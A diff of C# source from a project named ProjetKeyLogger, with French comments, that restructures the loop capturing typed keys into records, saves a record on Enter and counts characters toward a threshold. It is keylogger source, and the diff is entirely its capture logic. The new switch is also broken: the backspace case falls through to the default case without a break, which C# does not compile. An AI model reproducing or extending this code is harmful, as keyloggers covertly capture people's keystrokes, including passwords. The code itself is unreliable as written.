@@ -73,26 +73,35 @@ namespace ProjetKeyLogger
                     {
                         Console.Write((char)codeASCII);
 
-                        //Concatenation e la derniere touche tapée au contenu de l'enregistrement
-                        enregistrement.ajouterContenu((char)codeASCII);
+                        
 
                         //probleme : tout en majuscule + certaines touches non detectées
 
-                        //Si touche Entrée
-                        if (codeASCII == 13)
-                        {
-                            //On ajoute l'enregistrement a la collection
-                            collection_enregistrement.ajouter(enregistrement);
 
-                            //On réinitialise l'enregistrement
-                            enregistrement = new Enregistrement();
-                        }
-                        else
+                        switch (codeASCII)
                         {
-                            //Sinon on incrémente le nombre de caracteres tapé
-                            nb_caractere_tape += 1;
+                            //Si touche Entrée
+                            case 13:
+                                //On ajoute l'enregistrement a la collection
+                                collection_enregistrement.ajouter(enregistrement);
+
+                                //On réinitialise l'enregistrement
+                                enregistrement = new Enregistrement();
+                                break;
+
+                            case 8:
+                                enregistrement.effacerContenu();
+
+                            default:
+                                //Concatenation e la derniere touche tapée au contenu de l'enregistrement
+                                enregistrement.ajouterContenu((char)codeASCII);
+                                //Sinon on incrémente le nombre de caracteres tapé
+                                nb_caractere_tape += 1;
+                                break;
+
                         }
 
+                       
                         //Si plus de 100 caracteres ont été tapé
                         if (nb_caractere_tape > 100)
                         {
